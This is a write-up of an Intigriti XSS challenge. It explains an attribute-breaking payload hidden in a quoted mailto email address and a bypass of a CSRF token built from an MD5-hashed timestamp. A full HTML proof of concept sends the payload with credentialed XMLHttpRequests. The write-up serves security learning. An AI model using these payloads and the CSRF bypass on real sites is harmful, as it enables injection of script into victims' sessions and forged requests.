
## Intigriti — XSS Challenge 

![Capture](https://user-images.githubusercontent.com/59454895/112804703-fff84980-9074-11eb-972e-85a85c837655.PNG)

## Let's start

The challenge website had an input field to enter notes where we could write what we want.
First of all i tried to fuzz in order to see how the challenge would react , the first thing i noticed was a csrf token and our notes in the post request,
i also noticed that if we send a special character to escape the html tag with any strange element it will be sanitized by the server . After a while i
found out that the notes went through htmlspecialchars() function, which should help to prevent xss on this field because it can convert elements like < or > into  HTML entities.

Fortunately during my test i also tried to put an email in the note field ,it  helped me to find a hidden feature (the mailto attribute did not appear with other types of inputs).

![Capture3](https://user-images.githubusercontent.com/59454895/112806481-18696380-9077-11eb-95b0-8221d5b8cc54.PNG)

I tought it was interesting bacause maybe we could escape since the email address appears inside the href attribute of the HTML tag.
I decided to read how "mailto" works from the rfc , and i found out there is a strange way to declare the email with this attribute:
``` "\\\"it's\ ugly\\\""@example.org; ``` .

 It was a very good find , because it could allow to inject javascript between ``` "\\\"it's\ ugly\\\" ```  and ``` "@example.org; ```
  
the final payload was :
``` "\\\"traffik\prova\\\"\ onmouseover=alert('flag{THIS_IS_THE_FLAG}');//"@outlook.it  ```

The following payload breaks out of the attribute and adds an onmouseover event.
![Capture6](https://user-images.githubusercontent.com/59454895/112814874-063ff300-9080-11eb-9319-a2ce218340fb.PNG)


## CSRF Token bypass
The challenge had CSRF token(in this case hashed with MD5) built in. The page generates a token and stores it in a hidden form input.  That's a problem for our final POC because the server ensure that the form hasn’t been submitted by a malicious site thanks to this token , so we need to bypass it. 


First of all i tried to generate an empty csrf token and a csrf token of the same length as the original but nothing worked.
After a while i noticed that there was also a comment with a timestamp and it helped me a lot , because after a research i understood that the token was generated by taking the unix timestamp and hashandled it in md5 , that's not effective as a protection because is easy to predict .


![Capture5](https://user-images.githubusercontent.com/59454895/112812171-15717180-907d-11eb-91a2-a6b0f9df6459.PNG)

So in order to finish the challenge i made a POC where i could send my xss payload inside the notes parameter with the post request thanks to ``` XMLHttpReques ``` ,  to bypass the csrf token i just took the date with ``` Date.now() ``` function in js and hashandled all in md5.
Final POC:

```html
<html>
  <head>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/crypto-js/3.1.9-1/core.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/crypto-js/3.1.9-1/md5.js"></script>
  </head>
  <body>
    <button onclick="Esegui()">Execute Payload</button>
    <script>
        function Esegui() {
          var url = "https://challenge-0321.intigriti.io/";
          var flag = "\ onmouseover=alert('flag{THIS_IS_THE_FLAG}');//"
          var xss_payload = "\\\traffik\prova\\\" + flag + "@outlook.it "

          var d = Date.now().toString().substr(0,10);
          var csrf = CryptoJS.MD5(d).toString();
          var data = "csrf=" + csrf + "&notes=" + xss_payload;

          var request1 = new XMLHttpRequest();
          request1.open("GET",url);
          request1.withCredentials = true;

          request1.onreadystatechange = function () {
            var request2 = new XMLHttpRequest();
            request2.withCredentials = true;
            request2.open("POST", url);
            request2.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
            request2.send(data);
          }

          request1.send();
        }
    </script>
</body>
</html>
```
